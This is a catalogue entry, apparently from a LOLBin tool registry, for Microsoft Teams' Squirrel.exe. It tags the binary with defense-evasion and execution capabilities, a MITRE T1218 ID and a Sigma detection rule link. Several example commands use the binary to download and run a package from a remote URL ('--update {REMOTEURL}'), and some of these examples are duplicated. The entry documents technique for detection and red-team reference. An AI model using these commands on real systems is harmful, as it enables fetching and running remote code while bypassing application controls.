---
id: windows-execution-squirrel
namespace: windows:execution:squirrel
name: squirrel
description: 'Binary to update the existing installed Nuget/squirrel package. Part
  of Microsoft Teams installation. Located at: C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe.'
author: Reegun J (OCBC Bank) - @reegun21
version: 1.0.0
capabilities:
- network.transfer.download
- security.defense-evasion.bypass
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- squirrel
parameters: []
features:
- local
- network-intensive
- pipes-stdin
- pipes-stdout
- stealth
execution:
  template: squirrel
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: The above binary will go to url and look for RELEASES file and download
    the nuget package. (Download binary)
  command: squirrel.exe --download {REMOTEURL}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package. (Download and execute binary)
  command: squirrel.exe --update {REMOTEURL}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package. (Download and execute binary)
  command: squirrel.exe --update {REMOTEURL}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package. (Download and execute binary)
  command: squirrel.exe --updateRollback={REMOTEURL}
- description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package. (Download and execute binary)
  command: squirrel.exe --updateRollback={REMOTEURL}
references:
- label: watch?v=rOP3hnkj7ls
  url: https://www.youtube.com/watch?v=rOP3hnkj7ls
- label: '1144182772623269889'
  url: https://twitter.com/reegun21/status/1144182772623269889
- label: ''
  url: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
- label: nuget-squirrel-uncontrolled-endpoints-leads-to-arb
  url: https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
- label: update-nuget-squirrel-uncontrolled-endpoints-leads
  url: https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
techniques:
- exfiltration
- defense-evasion
- execution
mitre_ids:
- T1218
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
install:
- method: choco
  package_name: squirrel
  commands:
  - choco install squirrel
---

# squirrel

squirrel is a Windows LOLBin. Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation. Located at: C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe.
